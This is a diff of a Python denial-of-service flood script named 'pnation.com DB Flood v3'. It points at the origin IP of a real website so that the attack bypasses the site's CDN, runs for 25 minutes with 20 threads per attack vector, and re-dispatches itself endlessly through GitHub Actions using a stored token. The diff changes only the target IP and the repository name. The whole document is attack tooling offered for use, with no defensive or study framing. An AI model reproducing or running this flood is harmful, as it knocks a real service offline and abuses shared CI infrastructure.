@@ -2,7 +2,7 @@
 """
 pnation.com DB Flood v3 - Origin IP
 ====================================
-Target: 54.180.71.132 (AWS origin, DIRECT, bypass CDN)
+Target: 3.37.4.229 (AWS origin, DIRECT, bypass CDN)
 """
 
 import requests
@@ -23,7 +23,7 @@ def mk_sess():
     return s
 from concurrent.futures import ThreadPoolExecutor
 
-TARGET = "https://54.180.71.132"  # v3: 直连源站 IP (绕过CDN)
+TARGET = "https://3.37.4.229"  # v3: 直连源站 IP (绕过CDN)
 DURATION = 25 * 60  # 25 minutes
 THREADS_PER_VECTOR = 20  # 20 threads per attack vector
 
@@ -214,7 +214,7 @@ def flood_session():
 def sustain_trigger():
     """Call GitHub API to dispatch the next workflow run — infinite loop"""
     token = os.environ.get("PAT") or os.environ.get("GITHUB_TOKEN", "")
-    repo = os.environ.get("GITHUB_REPOSITORY", "wake875/pnation-db-flood")
+    repo = os.environ.get("GITHUB_REPOSITORY", "wake875/project-b81494")
     
     if not token:
         print("[Sustain] No GITHUB_TOKEN — skipping self-trigger")
